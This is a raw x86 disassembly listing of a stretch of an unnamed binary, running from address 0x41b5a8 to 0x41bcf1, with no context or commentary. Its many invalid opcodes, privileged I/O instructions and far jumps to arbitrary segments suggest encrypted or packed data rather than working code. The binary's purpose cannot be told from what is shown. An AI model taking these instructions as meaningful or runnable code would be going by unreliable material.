  41b5a8:	punpcklbw mm6,DWORD PTR [esi-0x60]
  41b5ac:	inc    ebp
  41b5ad:	jp     0x41b54c
  41b5af:	push   ss
  41b5b0:	xchg   edi,eax
  41b5b1:	loope  0x41b572
  41b5b3:	xor    DWORD PTR [ecx],esp
  41b5b5:	test   al,0x93
  41b5b7:	add    eax,0xef223d95
  41b5bc:	hlt    
  41b5bd:	stos   DWORD PTR es:[edi],eax
  41b5be:	pop    es
  41b5bf:	and    DWORD PTR [ecx-0x38],ebx
  41b5c2:	mov    BYTE PTR [edi+eiz*1+0x27],ah
  41b5c6:	xchg   esp,eax
  41b5c7:	ficomp WORD PTR [ecx-0x2aa11205]
  41b5cd:	ds imul eax,esi,0x49610e91
  41b5d4:	jns    0x41b5c1
  41b5d6:	es ins BYTE PTR es:[edi],dx
  41b5d8:	mov    BYTE PTR [ebx-0x4a],ah
  41b5db:	xchg   ebp,eax
  41b5dc:	repnz cmp BYTE PTR [edi-0x78],0xa1
  41b5e1:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b5e3:	mov    al,0x99
  41b5e5:	jle    0x41b62c
  41b5e7:	push   es
  41b5e8:	pop    edi
  41b5e9:	push   esp
  41b5ea:	ja     0x41b5b4
  41b5ec:	icebp  
  41b5ed:	sbb    ecx,DWORD PTR [edx]
  41b5ef:	(bad)  
  41b5f0:	push   ds
  41b5f1:	mov    edx,DWORD PTR [ebx+0x3f]
  41b5f4:	mov    bl,0x23
  41b5f6:	pusha  
  41b5f7:	test   eax,0xdbcd1695
  41b5fc:	outs   dx,BYTE PTR ds:[esi]
  41b5fd:	push   ss
  41b5fe:	pushf  
  41b5ff:	inc    edi
  41b600:	push   0xd9141bc9
  41b605:	aad    0x1d
  41b607:	test   BYTE PTR [edi+edi*2],bl
  41b60a:	shl    DWORD PTR [esp+ecx*2+0x3e83019b],0xeb
  41b612:	mov    ch,0xfa
  41b614:	mov    esp,DWORD PTR [esp+esi*4]
  41b617:	in     eax,0xa4
  41b619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b61a:	popa   
  41b61b:	xchg   esi,eax
  41b61c:	or     BYTE PTR [ebp+0x5d],0x33
  41b620:	push   0x41
  41b622:	ds (bad) 
  41b624:	lea    esi,[esi+edi*8-0x19]
  41b628:	loope  0x41b67a
  41b62a:	(bad)  
  41b62b:	loopne 0x41b5e8
  41b62d:	cmp    ebx,DWORD PTR [ecx-0x78]
  41b630:	mov    eax,0x57b39b83
  41b635:	leave  
  41b636:	mov    al,0x1f
  41b638:	xchg   edi,eax
  41b639:	cdq    
  41b63a:	jnp    0x41b63e
  41b63c:	fwait
  41b63d:	mov    dh,0xd7
  41b63f:	jo     0x41b61a
  41b641:	lods   al,BYTE PTR ds:[esi]
  41b642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b643:	xlat   BYTE PTR ds:[ebx]
  41b644:	in     eax,0xaf
  41b646:	stc    
  41b647:	imul   esp,ebp,0x18373f78
  41b64d:	in     al,0xdc
  41b64f:	adc    eax,0x365ed90a
  41b654:	repnz and eax,DWORD PTR [edx]
  41b657:	pop    ds
  41b658:	add    ebp,DWORD PTR [ebp+0x7d]
  41b65b:	in     eax,dx
  41b65c:	inc    edi
  41b65d:	ins    DWORD PTR es:[edi],dx
  41b65e:	mov    ah,0xcc
  41b660:	pop    ecx
  41b661:	pop    es
  41b662:	jns    0x41b65a
  41b664:	cld    
  41b665:	inc    esi
  41b666:	outs   dx,DWORD PTR ds:[esi]
  41b667:	cli    
  41b668:	sub    bl,al
  41b66a:	mov    ch,0xbb
  41b66c:	enter  0xb72e,0x62
  41b670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b671:	pop    es
  41b672:	das    
  41b673:	mov    ds:0x7b596346,eax
  41b678:	sub    dh,BYTE PTR [eax+edi*8]
  41b67b:	ficomp DWORD PTR [esi+ecx*4+0x19]
  41b67f:	sub    BYTE PTR [edi],bl
  41b681:	xor    eax,DWORD PTR [edi+0x2d]
  41b684:	and    eax,0x1caa2d6c
  41b689:	stos   BYTE PTR es:[edi],al
  41b68a:	lahf   
  41b68b:	call   0xfdaddd7b
  41b690:	dec    esp
  41b691:	bsf    esp,eax
  41b694:	dec    esi
  41b695:	inc    edi
  41b696:	aam    0x3e
  41b698:	cmp    al,0xe1
  41b69a:	sti    
  41b69b:	sbb    BYTE PTR [edx],0x6a
  41b69e:	jmp    0x946:0xa200186b
  41b6a5:	jae    0x41b680
  41b6a7:	and    ah,BYTE PTR [eax]
  41b6a9:	pop    esi
  41b6aa:	rcr    BYTE PTR [edx+0x3c],cl
  41b6ad:	adc    BYTE PTR [ecx+0x7b],0x15
  41b6b1:	arpl   WORD PTR [ebx-0x35],ax
  41b6b4:	in     al,0xd8
  41b6b6:	aaa    
  41b6b7:	retf   0xe6b7
  41b6ba:	inc    esi
  41b6bb:	xlat   BYTE PTR ds:[ebx]
  41b6bc:	sbb    BYTE PTR [ebx+0x93732c9],dh
  41b6c2:	sar    BYTE PTR [edi-0x10],0xbb
  41b6c6:	icebp  
  41b6c7:	mov    ecx,ebx
  41b6c9:	pop    eax
  41b6ca:	rol    BYTE PTR [eax+eax*2],cl
  41b6cd:	es lahf 
  41b6cf:	jmp    0x41b747
  41b6d1:	in     eax,dx
  41b6d2:	fisub  DWORD PTR [edi+esi*1]
  41b6d5:	aam    0x9a
  41b6d7:	std    
  41b6d8:	mov    cl,0x4d
  41b6da:	ja     0x41b681
  41b6dc:	jne    0x41b711
  41b6de:	rol    DWORD PTR [ebx],0xc6
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0xfd1970a]
  41b6f4:	xchg   edi,eax
  41b6f5:	jb     0x41b6cf
  41b6f7:	loopne 0x41b778
  41b6f9:	js     0x41b70b
  41b6fb:	jle    0x41b775
  41b6fd:	js     0x41b770
  41b6ff:	jns    0x41b6cb
  41b701:	pop    es
  41b702:	bound  esi,QWORD PTR [edi-0x73787be7]
  41b708:	xchg   esp,eax
  41b709:	inc    ecx
  41b70a:	adc    edx,DWORD PTR [edi+0x7184a5d7]
  41b710:	lahf   
  41b711:	lea    esp,[eax-0x46a8bcdf]
  41b717:	push   ebp
  41b718:	push   0x2d
  41b71a:	and    edi,edi
  41b71c:	xchg   esp,eax
  41b71d:	mov    ch,0x86
  41b71f:	inc    edx
  41b720:	push   cs
  41b721:	and    ch,bh
  41b723:	mov    esp,0xac9f9f14
  41b728:	scas   eax,DWORD PTR es:[edi]
  41b729:	loop   0x41b747
  41b72b:	pop    esp
  41b72c:	sbb    al,ch
  41b72e:	dec    esp
  41b72f:	xchg   esp,eax
  41b730:	inc    edx
  41b731:	jno    0x41b6c7
  41b733:	(bad)  
  41b734:	(bad)  
  41b735:	shr    DWORD PTR [ecx-0x7f],1
  41b738:	jg     0x41b73d
  41b73a:	or     edx,DWORD PTR [ebx-0x2e]
  41b73d:	loop   0x41b771
  41b73f:	fs mov ecx,0xed1aa1af
  41b745:	xor    eax,0x3df48fb7
  41b74a:	cwde   
  41b74b:	scas   eax,DWORD PTR es:[edi]
  41b74c:	cmp    al,0x5
  41b74e:	xchg   esp,eax
  41b74f:	adc    BYTE PTR [edx-0x42],dh
  41b752:	test   dl,ch
  41b754:	adc    eax,0xa22966f4
  41b759:	mov    eax,ds:0x9f3bcc84
  41b75e:	dec    esi
  41b75f:	addr16 pop ebp
  41b761:	dec    edi
  41b762:	pusha  
  41b763:	xlat   BYTE PTR ds:[ebx]
  41b764:	jo     0x41b71d
  41b766:	jle    0x41b72e
  41b768:	std    
  41b769:	inc    edi
  41b76a:	test   BYTE PTR [esi+0x5c880d20],dl
  41b770:	xlat   BYTE PTR ds:[ebx]
  41b771:	int    0xe6
  41b773:	pusha  
  41b774:	sub    dh,BYTE PTR [edi-0x51182584]
  41b77a:	jle    0x41b76c
  41b77c:	mov    ch,0x3b
  41b77e:	outs   dx,DWORD PTR ds:[esi]
  41b77f:	dec    ebp
  41b780:	adc    BYTE PTR [edi],ch
  41b782:	xor    ebp,edi
  41b784:	jne    0x41b798
  41b786:	les    eax,FWORD PTR ds:0xc39fd6b0
  41b78c:	xor    DWORD PTR [ecx],esp
  41b78e:	fld    QWORD PTR [ecx+0x4390f9a5]
  41b794:	and    esi,eax
  41b796:	mov    bl,0xef
  41b798:	and    DWORD PTR [edx-0x2ca20e40],esi
  41b79e:	mov    esp,ebx
  41b7a0:	push   eax
  41b7a1:	mov    ebx,0xdf05e5b5
  41b7a6:	leave  
  41b7a7:	adc    DWORD PTR [edx],esi
  41b7a9:	jge    0x41b81f
  41b7ab:	jmp    0x76b82c35
  41b7b0:	fs mov ch,0x43
  41b7b3:	in     al,dx
  41b7b4:	popa   
  41b7b5:	cmc    
  41b7b6:	dec    ebp
  41b7b7:	(bad)  
  41b7b8:	mov    ebx,0x3a34b4df
  41b7bd:	daa    
  41b7be:	(bad)  
  41b7bf:	test   al,0x5b
  41b7c1:	inc    ebp
  41b7c2:	inc    ebp
  41b7c3:	retf   
  41b7c4:	add    bl,BYTE PTR [esi-0xb]
  41b7c7:	and    esp,DWORD PTR [esi+ecx*2-0x12]
  41b7cb:	sub    BYTE PTR [edi-0x1eba7e93],dl
  41b7d1:	adc    DWORD PTR [edx],eax
  41b7d3:	or     DWORD PTR [eax+0x26],esp
  41b7d6:	ss pop ss
  41b7d8:	jge    0x41b80f
  41b7da:	ror    BYTE PTR [edx+0x38e628f6],0x52
  41b7e1:	mov    esi,DWORD PTR [ebx+0x326f33c8]
  41b7e7:	das    
  41b7e8:	pop    es
  41b7e9:	sbb    eax,0x2be1e62a
  41b7ee:	das    
  41b7ef:	aad    0x2e
  41b7f1:	mov    ch,BYTE PTR [esi-0x4c4bbadf]
  41b7f7:	ss xor eax,0x4694c33b
  41b7fd:	popa   
  41b7fe:	adc    al,0xf8
  41b800:	pop    edx
  41b802:	sub    eax,0x53785c57
  41b807:	jmp    0x41b78d
  41b809:	jo     0x41b7bd
  41b80b:	mov    ah,0x5d
  41b80d:	mov    ebx,0xbaa2a864
  41b812:	cwde   
  41b813:	xchg   edx,eax
  41b814:	arpl   WORD PTR es:[ebx],sp
  41b817:	test   BYTE PTR [edx],dh
  41b819:	and    ch,cl
  41b81b:	sti    
  41b81c:	adc    ebx,ebp
  41b81e:	and    BYTE PTR [esi-0x621aad3e],dl
  41b824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b825:	and    ecx,DWORD PTR [ecx-0xa]
  41b828:	jecxz  0x41b868
  41b82a:	add    eax,0x690d92c
  41b82f:	mov    esp,0x1b370e1
  41b834:	inc    eax
  41b835:	in     al,0x30
  41b837:	mov    edx,ebx
  41b839:	jle    0x41b7dc
  41b83b:	loopne 0x41b8bb
  41b83d:	mov    bh,BYTE PTR [esi-0x20]
  41b840:	loop   0x41b85d
  41b842:	or     al,0x4a
  41b844:	dec    esp
  41b845:	and    bl,BYTE PTR [ecx-0x14c35203]
  41b84b:	in     al,dx
  41b84c:	dec    ebp
  41b84d:	in     eax,0x36
  41b84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b850:	repz sub DWORD PTR [esi-0x5bb24b34],edi
  41b857:	cmp    eax,0x3d31c099
  41b85c:	add    cl,al
  41b85e:	xchg   edx,eax
  41b85f:	jb     0x41b891
  41b861:	xor    BYTE PTR [edi+eiz*1-0x39],dl
  41b865:	enter  0xd79e,0x7e
  41b869:	loop   0x41b804
  41b86b:	sti    
  41b86c:	pop    esp
  41b86d:	lea    esp,[eax-0x72baff9]
  41b873:	jnp    0x41b8d0
  41b875:	or     BYTE PTR [ebx+0x19ee897c],cl
  41b87b:	mov    ah,0x7d
  41b87d:	mov    edi,0x7c3b5f7b
  41b882:	ins    BYTE PTR es:[edi],dx
  41b883:	jne    0x41b858
  41b885:	xchg   esi,eax
  41b886:	repz mov ds:0xd127537e,al
  41b88c:	jno    0x41b85c
  41b88e:	leave  
  41b88f:	aaa    
  41b890:	xchg   ecx,eax
  41b891:	adc    esp,ebx
  41b893:	mov    edx,cs
  41b895:	pop    ss
  41b896:	(bad)  
  41b897:	cmp    DWORD PTR [edi-0x80],ebx
  41b89a:	xchg   esp,eax
  41b89b:	fisttp QWORD PTR [eax-0x38a39e4]
  41b8a1:	sub    dh,dl
  41b8a3:	cmp    al,0x6c
  41b8a5:	xor    ebp,DWORD PTR [ecx]
  41b8a7:	or     ch,cl
  41b8a9:	add    DWORD PTR [ecx-0x7a],edi
  41b8ac:	inc    ebx
  41b8ad:	(bad)  
  41b8ae:	lock loope 0x41b908
  41b8b1:	xor    ebp,DWORD PTR [edi+0x84da2e5]
  41b8b7:	(bad)  
  41b8b8:	and    BYTE PTR [edi+0x41],dl
  41b8bb:	fidiv  DWORD PTR [ecx+eax*2-0x14ae7eb6]
  41b8c2:	sbb    DWORD PTR [edi],edi
  41b8c4:	mov    ah,0x18
  41b8c6:	xchg   ebx,eax
  41b8c7:	icebp  
  41b8c8:	lea    esp,[ebx+ecx*4-0x52bbf7ac]
  41b8cf:	fdivrp st(5),st
  41b8d1:	adc    ebp,DWORD PTR [ebx*8+0x3756c1b2]
  41b8d8:	je     0x41b8d2
  41b8da:	in     al,0xc7
  41b8dc:	scas   al,BYTE PTR es:[edi]
  41b8dd:	popf   
  41b8de:	mov    gs,WORD PTR [ecx+0x3a6c5d6d]
  41b8e4:	push   ds
  41b8e5:	and    al,0x88
  41b8e7:	shl    ch,cl
  41b8e9:	inc    ebp
  41b8ea:	inc    esi
  41b8eb:	dec    eax
  41b8ec:	dec    ebx
  41b8ed:	fild   DWORD PTR [ebp+0x4d61f512]
  41b8f3:	jnp    0x41b8ab
  41b8f5:	and    bh,ch
  41b8f7:	(bad)  
  41b8f9:	inc    ecx
  41b8fa:	lahf   
  41b8fb:	push   0x61d8eb85
  41b900:	pop    esi
  41b901:	mov    bh,0x61
  41b903:	jo     0x41b93c
  41b905:	push   0xffffffb0
  41b907:	fmul   QWORD PTR [ebx]
  41b909:	mov    WORD PTR [eax+0x6],gs
  41b90c:	mov    cl,0xa6
  41b90e:	das    
  41b90f:	popf   
  41b910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b911:	(bad)  [esi+0x2e]
  41b914:	lock daa 
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x11cd2136]
  41b92f:	push   0x17
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b920
  41b93a:	and    esi,DWORD PTR [eax+0x55]
  41b93d:	pop    edx
  41b93e:	ss inc ecx
  41b940:	aas    
  41b941:	mov    bh,0x94
  41b943:	lods   al,BYTE PTR ds:[esi]
  41b944:	dec    esi
  41b945:	pop    ecx
  41b946:	mov    ecx,0xb2455cce
  41b94b:	lods   al,BYTE PTR ds:[esi]
  41b94c:	loopne 0x41b9b9
  41b94e:	xor    dh,dl
  41b950:	ins    DWORD PTR es:[edi],dx
  41b951:	cmp    cl,bh
  41b953:	nop
  41b954:	jle    0x41b9b9
  41b956:	fisub  WORD PTR [eax+0x76]
  41b959:	mov    dl,0x56
  41b95b:	test   BYTE PTR [ecx-0x1f],bl
  41b95e:	xor    DWORD PTR [ecx+esi*4],esi
  41b961:	or     eax,0x2b434498
  41b966:	(bad)  
  41b967:	dec    DWORD PTR [edi+0x84c7320]
  41b96d:	mov    ds:0xc07115c3,al
  41b972:	jge    0x41b918
  41b974:	hlt    
  41b975:	adc    ebx,DWORD PTR [esi-0x24]
  41b978:	mov    dh,0x12
  41b97a:	jbe    0x41b9ca
  41b97c:	ret    0x1989
  41b97f:	(bad)  
  41b980:	cli    
  41b981:	aaa    
  41b982:	or     DWORD PTR [edi+0x52],ebx
  41b985:	xor    BYTE PTR [ecx],0x7f
  41b988:	jp     0x41b956
  41b98a:	jg     0x41b9d7
  41b98c:	jmp    0xfd2f:0x70a7a370
  41b993:	or     DWORD PTR [edi],ecx
  41b995:	je     0x41b9a0
  41b997:	cmp    al,0xf7
  41b999:	jno    0x41b957
  41b99b:	ss jmp 0x8b78:0x807be8ac
  41b9a3:	rcl    esp,1
  41b9a5:	cmc    
  41b9a6:	jl     0x41ba20
  41b9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9a9:	pusha  
  41b9aa:	sbb    BYTE PTR [ebx+0x28],bh
  41b9ad:	sbb    BYTE PTR [ebx],bh
  41b9af:	aaa    
  41b9b0:	popa   
  41b9b1:	mov    ebp,0x2d056a7c
  41b9b6:	jmp    0x38e84902
  41b9bb:	sub    eax,DWORD PTR [ecx]
  41b9bd:	out    0x9,al
  41b9bf:	pop    ebx
  41b9c0:	dec    edi
  41b9c1:	popa   
  41b9c2:	jae    0x41b9c6
  41b9c4:	and    al,0x31
  41b9c6:	shl    BYTE PTR ds:0xc45d7f15,cl
  41b9cc:	adc    edx,DWORD PTR [edx+ebx*2-0x2c]
  41b9d0:	(bad)  
  41b9d1:	daa    
  41b9d2:	les    esi,FWORD PTR cs:[ecx+0x61]
  41b9d6:	sbb    al,0x3
  41b9d8:	push   ebx
  41b9d9:	inc    esi
  41b9da:	out    0x1,al
  41b9dc:	mov    edi,edi
  41b9de:	in     al,dx
  41b9df:	dec    edi
  41b9e0:	and    edx,esi
  41b9e2:	sahf   
  41b9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9e4:	mov    ah,0x5f
  41b9e6:	jne    0x41ba54
  41b9e8:	fnsave [edi]
  41b9ea:	retf   0xfa6c
  41b9ed:	and    esp,ecx
  41b9ef:	mov    ah,0x20
  41b9f1:	push   cs
  41b9f2:	(bad)  
  41b9f3:	mov    ecx,0x3a71bd58
  41b9f8:	cmp    al,0xe1
  41b9fa:	jne    0x41ba17
  41b9fc:	fild   QWORD PTR [ebp-0xa]
  41b9ff:	or     eax,0xde6e6ee3
  41ba04:	cli    
  41ba05:	mov    ebp,0x9abd3334
  41ba0a:	jmp    0x78e7:0x8fb96d77
  41ba11:	and    bl,bl
  41ba13:	mov    ebp,0xe6e1d03c
  41ba18:	je     0x41ba8b
  41ba1a:	inc    ecx
  41ba1b:	gs (bad) 
  41ba1d:	push   ebx
  41ba1e:	js     0x41ba95
  41ba20:	out    0xe4,al
  41ba22:	dec    esi
  41ba23:	adc    cl,BYTE PTR [eax]
  41ba25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba26:	jge    0x41b9fd
  41ba28:	imul   esp,DWORD PTR [ecx],0x45
  41ba2b:	xor    BYTE PTR [ebx],ch
  41ba2d:	shl    BYTE PTR [eax+0x5b1bc193],1
  41ba33:	adc    eax,0x7f38302b
  41ba38:	jmp    0x41ba6b
  41ba3a:	xchg   ecx,eax
  41ba3b:	(bad)  
  41ba3c:	lods   al,BYTE PTR ds:[esi]
  41ba3d:	adc    cl,dl
  41ba3f:	pop    edx
  41ba40:	xchg   ebp,eax
  41ba41:	cmp    al,0x96
  41ba43:	mov    eax,ds:0x47609274
  41ba48:	ins    BYTE PTR es:[edi],dx
  41ba49:	xlat   BYTE PTR ds:[ebx]
  41ba4a:	out    dx,al
  41ba4b:	jmp    0x6c0202b6
  41ba50:	lods   al,BYTE PTR ds:[esi]
  41ba51:	push   ecx
  41ba52:	loop   0x41b9fc
  41ba54:	sub    esi,edi
  41ba56:	mov    al,0x56
  41ba58:	ins    BYTE PTR es:[edi],dx
  41ba59:	sbb    ch,BYTE PTR ds:0xa9adf647
  41ba5f:	jno    0x41b9f7
  41ba61:	push   esi
  41ba62:	out    0x33,al
  41ba64:	rcl    ecx,0xf3
  41ba67:	mov    cl,0x93
  41ba69:	out    0x43,eax
  41ba6b:	cmp    BYTE PTR [edx],bl
  41ba6d:	or     eax,0x4e30cac3
  41ba72:	dec    esp
  41ba73:	mov    WORD PTR [esp+ecx*4-0x1600289b],gs
  41ba7a:	(bad)  
  41ba7b:	imul   eax,DWORD PTR [eax],0x15640871
  41ba81:	inc    esp
  41ba82:	and    al,0xbe
  41ba84:	or     dh,ah
  41ba86:	call   0xcd87c22a
  41ba8b:	mov    dl,0x70
  41ba8d:	sbb    BYTE PTR [ecx],0xe7
  41ba90:	cld    
  41ba91:	mov    dh,0xb1
  41ba93:	mov    WORD PTR [ecx+edi*4+0x7d6094dc],ds
  41ba9a:	xchg   ebx,eax
  41ba9b:	and    DWORD PTR [edi+ecx*4],ecx
  41ba9e:	js     0x41ba32
  41baa0:	mov    eax,ds:0x131521b6
  41baa5:	xchg   edx,eax
  41baa6:	(bad)  
  41baa7:	xor    eax,0xd122d3a7
  41baac:	dec    ebx
  41baad:	enter  0x587d,0xc2
  41bab1:	mov    edi,0xbee8ae8f
  41bab6:	inc    ebx
  41bab7:	dec    esi
  41bab8:	test   BYTE PTR [edx],dl
  41baba:	sub    eax,0xbe3a4734
  41babf:	push   ebx
  41bac0:	mov    bl,cl
  41bac2:	xor    al,ch
  41bac4:	std    
  41bac5:	cmp    DWORD PTR [ecx+0x195baa5d],0x695b89c9
  41bacf:	je     0x41baa3
  41bad1:	xlat   BYTE PTR ds:[ebx]
  41bad2:	or     DWORD PTR [edx+0x7e],eax
  41bad5:	dec    ebx
  41bad6:	and    DWORD PTR [edx+0x34],ebp
  41bad9:	jp     0x41ba83
  41badb:	shl    edx,1
  41badd:	mov    ds:0xa98614c3,eax
  41bae2:	enter  0x8b36,0xf2
  41bae6:	in     al,dx
  41bae7:	or     eax,0x7c28e056
  41baec:	inc    ebx
  41baed:	stc    
  41baee:	ins    DWORD PTR es:[edi],dx
  41baef:	mov    ds:0x5a504d7b,eax
  41baf4:	inc    esi
  41baf5:	adc    BYTE PTR [ecx+esi*2-0x262a4717],ch
  41bafc:	push   esi
  41bafd:	lahf   
  41bafe:	add    DWORD PTR [ebx-0x48],ebx
  41bb01:	sub    esp,ebp
  41bb03:	mov    al,0x9b
  41bb05:	ins    BYTE PTR es:[edi],dx
  41bb06:	mov    ah,0x35
  41bb08:	icebp  
  41bb09:	xlat   BYTE PTR ds:[ebx]
  41bb0a:	pop    ecx
  41bb0b:	sar    BYTE PTR [ebp+0x7acce840],1
  41bb11:	pop    ebx
  41bb12:	push   es
  41bb13:	inc    esi
  41bb14:	push   esp
  41bb15:	pop    edx
  41bb16:	add    dl,bh
  41bb18:	ja     0x41ba9e
  41bb1a:	cs jecxz 0x41bb90
  41bb1d:	mov    esp,0x80cec5bf
  41bb22:	mov    cl,0xac
  41bb24:	lds    esp,FWORD PTR [esi-0x43]
  41bb27:	mov    ebp,0xbe390817
  41bb2c:	fstp   DWORD PTR [edi+0x402b0aa7]
  41bb32:	mov    BYTE PTR [eax],ch
  41bb34:	jae    0x41bad3
  41bb36:	sub    eax,0x8a04fdd6
  41bb3b:	mov    ds:0x5a85abc1,eax
  41bb40:	scas   eax,DWORD PTR es:[edi]
  41bb41:	sbb    al,0x1e
  41bb43:	sbb    ah,BYTE PTR [edx-0x4e]
  41bb46:	inc    edx
  41bb47:	add    al,0xb0
  41bb49:	sti    
  41bb4a:	fwait
  41bb4b:	rol    BYTE PTR [edx+0x41c467a],cl
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x4517bf12
  41bb65:	sbb    eax,DWORD PTR gs:[eax+ecx*4-0x1c]
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb0e
  41bb71:	jl     0x41bb80
  41bb73:	ja     0x41bb40
  41bb75:	mov    al,ds:0x7bb7ce9a
  41bb7a:	adc    ebp,DWORD PTR [ebx]
  41bb7c:	dec    edi
  41bb7d:	jge    0x41bbb0
  41bb7f:	cmp    al,0x4d
  41bb81:	cmp    DWORD PTR [edx-0x3a],esi
  41bb84:	dec    ecx
  41bb85:	pop    edi
  41bb86:	xor    DWORD PTR [ecx-0x5749d517],ebp
  41bb8c:	fdivr  QWORD PTR cs:[edx-0xe54b273]
  41bb93:	mov    ch,0x51
  41bb95:	pop    ebx
  41bb96:	gs ins BYTE PTR es:[edi],dx
  41bb98:	dec    esi
  41bb99:	or     BYTE PTR [edi-0x6e],al
  41bb9c:	xchg   BYTE PTR [ebx+0x46eb290c],dl
  41bba2:	retf   0x46ac
  41bba5:	mov    ecx,0x46ff4a39
  41bbaa:	mov    eax,0x3217897d
  41bbaf:	popf   
  41bbb0:	jmp    0x564b76c1
  41bbb5:	jmp    0xc629:0xe3c42dba
  41bbbc:	jmp    0xec65e22e
  41bbc1:	inc    ebp
  41bbc2:	and    esp,DWORD PTR [eax-0x75]
  41bbc5:	sub    edi,DWORD PTR [ebx-0x34]
  41bbc8:	add    eax,0x87414095
  41bbcd:	pop    ss
  41bbce:	and    DWORD PTR [eax],0xb6ee7050
  41bbd4:	rcr    DWORD PTR [edx-0x31],1
  41bbd7:	out    dx,eax
  41bbd8:	pop    ebx
  41bbd9:	iret   
  41bbda:	mov    dl,0x71
  41bbdc:	ret    
  41bbdd:	xor    BYTE PTR [esi+0x35],0xf5
  41bbe1:	xor    dl,ah
  41bbe3:	clc    
  41bbe4:	repnz test eax,0x68724674
  41bbea:	scas   al,BYTE PTR es:[edi]
  41bbeb:	(bad)  
  41bbec:	xor    al,0xea
  41bbee:	mov    ds:0x70cce7b3,al
  41bbf3:	dec    edi
  41bbf4:	xor    al,0x16
  41bbf6:	sbb    eax,0x7efbea5a
  41bbfb:	not    BYTE PTR [esi+0x72ecbc17]
  41bc01:	and    eax,0xfe813081
  41bc06:	xor    al,0xf4
  41bc08:	xlat   BYTE PTR ds:[ebx]
  41bc09:	jnp    0x41bc50
  41bc0b:	call   0x2ba8f1
  41bc10:	sti    
  41bc11:	or     eax,0x6ba9146c
  41bc16:	sbb    cl,BYTE PTR [ebx]
  41bc18:	dec    esi
  41bc19:	in     eax,dx
  41bc1a:	xchg   ebx,eax
  41bc1b:	mov    cl,0x68
  41bc1d:	jae    0x41bc0e
  41bc1f:	dec    ecx
  41bc20:	ds stos BYTE PTR es:[edi],al
  41bc22:	sbb    BYTE PTR [eax],dl
  41bc24:	jg     0x41bc06
  41bc26:	out    0x5d,eax
  41bc28:	lods   al,BYTE PTR ds:[esi]
  41bc29:	mov    ecx,0x2d027836
  41bc2e:	inc    edx
  41bc2f:	adc    BYTE PTR [edi+0x21cea4b],ch
  41bc35:	fst    QWORD PTR [edi+eiz*2]
  41bc38:	pop    ds
  41bc39:	xchg   esi,eax
  41bc3a:	push   ebp
  41bc3b:	sub    ecx,DWORD PTR [ebx-0x55a8a8d0]
  41bc41:	out    0x2c,eax
  41bc43:	or     al,0x7b
  41bc45:	retf   0x877d
  41bc48:	icebp  
  41bc49:	nop
  41bc4a:	test   ecx,ecx
  41bc4c:	adc    DWORD PTR [eax+0x6ece1af2],edi
  41bc52:	jne    0x41bc98
  41bc54:	sub    al,0xbc
  41bc56:	test   DWORD PTR [ecx+ebp*2+0x65fb1668],0xda46f550
  41bc61:	aam    0x2b
  41bc63:	cmp    eax,0xa3233e5f
  41bc68:	push   ds
  41bc69:	mov    bh,0x7c
  41bc6b:	in     al,0xd2
  41bc6d:	rcr    DWORD PTR [esi],1
  41bc6f:	sbb    al,0xed
  41bc71:	mov    bh,0xef
  41bc73:	pop    ss
  41bc74:	jmp    0x41bca5
  41bc76:	fcmovnu st,st(7)
  41bc78:	out    dx,eax
  41bc79:	jb     0x41bc67
  41bc7b:	repnz mov al,ds:0xa4ae0af0
  41bc81:	pop    edx
  41bc82:	out    0x83,al
  41bc84:	mov    ds:0xb78a3939,al
  41bc89:	push   ss
  41bc8a:	jecxz  0x41bc9c
  41bc8c:	cmp    bl,BYTE PTR [esi+0x3bce561f]
  41bc92:	sar    DWORD PTR [ebp+0x6c],cl
  41bc95:	aaa    
  41bc96:	ds jge 0x41bc6f
  41bc99:	xchg   ecx,eax
  41bc9a:	js     0x41bc6c
  41bc9c:	jmp    0x64c40ac4
  41bca1:	inc    ebp
  41bca2:	push   ebx
  41bca3:	xor    BYTE PTR [eax+0x7c],ch
  41bca6:	pop    edi
  41bca7:	add    al,0x68
  41bca9:	mov    bl,0xfa
  41bcab:	mov    dl,0x79
  41bcad:	or     al,BYTE PTR [edx-0x724b870e]
  41bcb3:	xor    al,0xce
  41bcb5:	cmovb  edx,esi
  41bcb8:	mov    ebp,0x5053bc1b
  41bcbd:	jecxz  0x41bce1
  41bcbf:	mov    cl,0xa
  41bcc1:	push   cs
  41bcc2:	sub    BYTE PTR [eax+0x4a],ah
  41bcc5:	and    eax,0x72f24e58
  41bcca:	pop    ebx
  41bccb:	cs lahf 
  41bccd:	aam    0xc
  41bccf:	and    ecx,DWORD PTR [ebx+ebp*2-0x6a2ec8a1]
  41bcd6:	lds    ebp,FWORD PTR [eax]
  41bcd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcd9:	hlt    
  41bcda:	jno    0x41bcb2
  41bcdc:	clc    
  41bcdd:	(bad)
  41bce1:	sbb    eax,DWORD PTR [ecx-0x659b730f]
  41bce7:	jns    0x41bc91
  41bce9:	cmp    esp,DWORD PTR ds:0x9000d85e
  41bcef:	aam    0xdb
  41bcf1:	push   es
